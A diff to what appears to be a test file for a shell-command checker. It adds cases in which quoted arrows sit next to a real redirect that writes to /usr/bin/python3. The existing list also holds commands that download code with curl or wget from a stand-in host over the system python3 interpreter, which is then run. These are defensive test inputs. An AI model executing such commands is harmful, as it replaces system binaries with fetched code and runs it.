@@ -646,6 +646,10 @@ describe('#874 (e) long interpreter files and the re-scan budget', () => {
     '(cd /usr/bin && cp /tmp/x python[3])',
     '(cd /usr/bin && curl -opython3 https://example.test/x)',
     '(cd /usr/bin && wget -Opython3 https://example.test/x)',
+    // Review r7: quoted data ending in an arrow must not swallow a real redirect.
+    '(cd /usr/bin && echo "->" >python3)',
+    '(cd /usr/bin && echo "->" > python3)',
+    '(cd /usr/bin && echo "=>" >python3)',
   ];
   it.each(BIN_WRITES.flatMap(w => [
     `${w}; python3 scripts/dual.py`,
